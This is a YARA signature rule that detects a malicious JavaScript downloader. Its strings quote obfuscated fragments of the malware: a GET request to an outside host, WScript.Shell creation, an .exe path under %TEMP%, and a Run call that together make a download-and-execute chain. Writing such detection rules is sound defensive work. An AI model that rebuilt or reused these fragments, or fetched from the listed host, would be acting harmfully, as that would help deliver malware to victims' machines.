rule sig_20160401_047ccd3e5c0da3705d3871518143c721 {
  meta:
    description = "datamaliciousorder - file 20160401_047ccd3e5c0da3705d3871518143c721.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "956eae3d73f728feb2093b858ffdc39295e5eaa6a561c5510d38aa2e9d98b7df"

  strings:
    $s1  = "ApnXl[LlpEil](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "var FrgXnu = function ZanJu() {return WScript[KaxFbb](\"WScript\"+\".Shell\");}(), ZsxEw = 11;" fullword ascii
    $s3  = "function AsMvg(GivEls, KbfMui){NjKmr = NjKmr * 1; return GivEls - KbfMui;};" fullword ascii
    $s4  = "if (ApnXl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IydLpv() {return FrgXnu[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qGZaI73MQU.ex\" + \"e\";};" fullword ascii
    $s6  = "function ItmVq(){return JySrz + \"\";};" fullword ascii
    $s7  = "function ZwdWpz() {return ((GwuYe == true) && (GwuYe == AkfLqq)) ? 1 : NjKmr;};" fullword ascii
    $s8  = "function QwIl(UddHe) {var JbUqt = (1, 2, 3, 4, 5, UddHe); return JbUqt;};" fullword ascii
    $s9  = "function KzqMx(WyvLea){FrgXnu[\"R\"+\"un\"](WyvLea, NjKmr, NjKmr);};" fullword ascii
    $s10 = "return AsMvg(WcHoq, KmAfb);" fullword ascii
    $s11 = "AkfLqq = true; " fullword ascii
    $s12 = "var GwuYe = false;" fullword ascii
    $s13 = "function LtcFt()" fullword ascii
    $s14 = "function MsLd(){return 23;};" fullword ascii
    $s15 = "var CtIru = false;" fullword ascii
    $s16 = "var AkfLqq = false;" fullword ascii
    $s17 = "var LoIg = new this[\"Date\"]();" fullword ascii
    $s18 = "GwuYe = true; " fullword ascii
    $s19 = "}while (JdjHo);" fullword ascii
    $s20 = "function IawQnw(){return KaxFbb;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}